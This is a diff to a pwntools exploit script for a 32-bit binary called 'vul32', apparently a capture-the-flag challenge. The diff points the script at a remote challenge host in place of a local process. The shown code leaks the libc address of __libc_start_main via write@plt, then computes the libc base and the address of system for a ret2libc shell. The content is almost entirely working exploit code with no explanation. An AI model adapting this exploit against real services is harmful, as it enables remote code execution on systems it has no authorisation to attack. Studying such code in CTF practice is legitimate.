@@ -1,12 +1,12 @@
 from pwn import *
 
-# context.log_level = 'debug'
+context.log_level = 'debug'
 
 # context.terminal = ['tmux','splitw','-h']
-sh = process('./vul32')
+# sh = process('./vul32')
 elf = ELF('./vul32')
 # pwnlib.gdb.attach(proc.pidof(sh)[0])
-# sh = remote('cssc.vul337.team', 49244)
+sh = remote('cssc.vul337.team', 49251)
 # conn.recvline()
 
 func_plt = elf.plt['write']
@@ -24,9 +24,9 @@ libc = ELF('libc.so.6')
 libc_start_main_offset = libc.symbols['__libc_start_main']
 system_offset = libc.symbols['system']
 
-print(hex(libc_start_main_offset))
-print(hex(system_offset))
-print(re)
+# print(hex(libc_start_main_offset))
+# print(hex(system_offset))
+# print(re)
 libc_start_main_addr = u32(re)
 libcbase = libc_start_main_addr - libc_start_main_offset
 system_addr = libcbase + system_offset
